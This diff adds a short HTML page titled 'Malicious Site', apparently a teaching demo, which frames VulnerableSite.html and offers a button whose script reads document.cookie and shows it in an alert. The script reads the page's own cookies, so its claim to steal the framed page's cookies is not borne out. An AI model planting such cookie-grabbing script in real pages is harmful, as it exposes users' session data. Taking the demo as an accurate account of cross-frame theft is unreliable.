@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Site</title>
+</head>
+<body>
+    <h1>Malicious Site</h1>
+    <p>This page will steal cookies from VulnerableSite.html through an iFrame.</p>
+    <button onclick="takeCookies();">Take Cookies</button>
+    <br>
+    <iframe src="./VulnerableSite.html" width="1024" height="1024"></iframe>
+    <script>
+        let stolenCookie;
+        function takeCookies(){
+            stolenCookie = document.cookie;
+            alert('A cookie has been taken from VulnerableSite: ' + stolenCookie);
+        }
+    </script>
+</body>
+</html>
